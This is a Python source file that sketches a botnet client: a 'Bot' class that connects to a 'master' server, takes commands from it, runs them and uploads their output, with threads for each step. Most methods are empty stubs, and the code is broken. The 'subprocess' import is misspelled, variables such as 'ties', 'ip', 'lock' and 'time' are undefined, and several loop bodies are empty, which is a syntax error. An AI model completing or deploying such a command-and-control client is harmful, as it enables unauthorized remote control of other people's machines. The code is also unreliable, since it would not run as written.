#!/usr/bin/env python3
import os, sys
import socket
import subproccess
from threading import Thread, Lock

class Bot:
    def __init__(self, ip, port, nofail=True):
        self.ip = ip
        self.port = port

        #if true client will continue to search for server even after failing todo so first time
        self.nofail = nofail

        #stores commands recieved by server and their outputs - (CMDID, CMD/output)
        self.commands = []
        self.cmd_outputs = []

        #lock used to ensure threads dont access cmd outputs at same time
        self.lock = Lock()

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        self.sock.setsockopt()

        self._connect_to_master()

        #create threads for getting, running and uploading command results
        get_cmds = Thread()
        run_cmds = Thread()
        upl_cmds = Thread()

        keepalive()

    ''' Sends packets to server every 5 seconds to let it know client is still active '''
    def keepalive():
        pass

    def _connect_to_master(self):
        found = 0
        tries = 0

        while True:
            try:
                print("[*] INFO: Attempting to connect to master")
                self.sock.connect((ip, port))

                #get client-ID from server
                self.bot_ID = self.sock.recv().decode()

                #send client info to server

                #wait for server ack of data uploaded to database

                print("[+] Connected to master")
                found = 1
                break

            except Exception:
                ties += 1
                if not self.nofail and ties == 3: break
                time.sleep(5)

        if not found:
            print("[-] ERROR: Unable to connect to server at address: {}:{}".format(self.ip, self.port))
            sys.exit(-1)

    def _get_commands(self):
        while True:
            #listen for commands

    ''' Checks for and runs commands '''
    def _run_commands(self):
        while True:

            time.sleep(3)


    ''' outputs command outputs to database '''
    def _upload_command_outputs(self):
        #NOTE: Ran as a seperate thread
        while True:
            #acquires lock - will wait for lock to be released if needed
            lock.acquire()

            lock.release()
            time.sleep(2)

    ''' Executes command and returns output
        :param cmd: command to execute
        :output str: output of command as a str '''
    def execute_command(self, cmd, cmdID):
        #execute command

        #get output
        lock.acquire()

        lock.release()

def main():
    pass

if __name__ == '__main__':
    main()
